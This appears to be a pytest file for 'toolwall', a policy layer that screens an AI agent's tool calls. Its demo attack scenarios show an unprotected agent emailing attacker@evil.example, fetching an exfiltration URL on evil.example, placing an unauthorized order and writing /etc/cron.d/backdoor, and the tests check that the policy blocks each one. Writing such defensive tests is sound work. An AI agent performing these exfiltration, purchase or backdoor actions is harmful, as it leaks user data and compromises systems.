from pathlib import Path

import yaml

from toolwall import Effect, Toolwall
from toolwall.demo import SCENARIOS, main, mock_model, run_scenario
from toolwall.engine import auto_deny


def test_demo_main_and_world_state(tmp_path, capsys) -> None:
    audit = tmp_path / "audit.jsonl"
    assert main(["--audit", str(audit)]) == 0
    output = capsys.readouterr().out
    assert "blocked 5/5 attacks, allowed 1/1 benign task" in output
    assert len(audit.read_text().splitlines()) == sum(
        len(mock_model(scenario.id)) for scenario in SCENARIOS
    )

    wall = Toolwall.from_file(
        str(Path(__file__).parents[1] / "toolwall" / "demo_policy.yaml"),
        escalate=auto_deny,
    )
    results = [run_scenario(scenario, wall) for scenario in SCENARIOS]
    assert results[0].unprotected_world.sent_emails[0]["to"] == "attacker@evil.example"
    assert results[1].unprotected_world.http_gets
    assert results[2].unprotected_world.orders
    assert results[3].unprotected_world.files_written[0]["path"] == "/etc/cron.d/backdoor"
    assert len(results[4].unprotected_world.http_gets) == 20
    assert all(result.protected == result.scenario.protected for result in results)
    assert not results[0].protected_world.sent_emails
    assert not results[1].protected_world.http_gets
    assert not results[2].protected_world.orders
    assert not results[3].protected_world.files_written
    assert len(results[4].protected_world.http_gets) == 5
    assert results[2].blocked_policies == ["sensitive:submit_order"]
    assert results[3].blocked_policies == ["arg_rules:write_file.path"]
    assert set(results[4].blocked_policies) == {"rate_limit:http_get"}
    assert results[5].protected_world.sent_emails[0]["to"] == "teammate@example.com"


def test_demo_policy_blockers_and_email_defense_in_depth() -> None:
    wall = Toolwall.from_file(
        str(Path(__file__).parents[1] / "toolwall" / "demo_policy.yaml"),
        escalate=auto_deny,
    )
    host = wall.check("send_email", {"to": "attacker@evil.example", "body": "plain"})
    canary = wall.check("send_email", {"to": "teammate@example.com", "body": "CANARY-7F3A"})
    url = wall.check("http_get", {"url": "https://evil.example/log?d=plain"})
    assert host.effect is canary.effect is Effect.DENY
    assert host.policy == "arg_rules:send_email.to"
    assert canary.policy.startswith("arg_rules:send_email.")
    assert url.policy == "arg_rules:http_get.url"


def test_broken_policy_makes_self_check_fail(tmp_path, monkeypatch, capsys) -> None:
    source = Path(__file__).parents[1] / "toolwall" / "demo_policy.yaml"
    policy = yaml.safe_load(source.read_text())
    policy["tools"]["submit_order"]["sensitive"] = False
    broken = tmp_path / "broken.yaml"
    broken.write_text(yaml.safe_dump(policy))
    monkeypatch.setattr("toolwall.demo.DEMO_POLICY", broken)

    assert (
        main(
            [
                "--scenario",
                "unauthorized_purchase",
                "--audit",
                str(tmp_path / "audit.jsonl"),
            ]
        )
        == 1
    )
    assert "mismatch: unauthorized_purchase" in capsys.readouterr().out
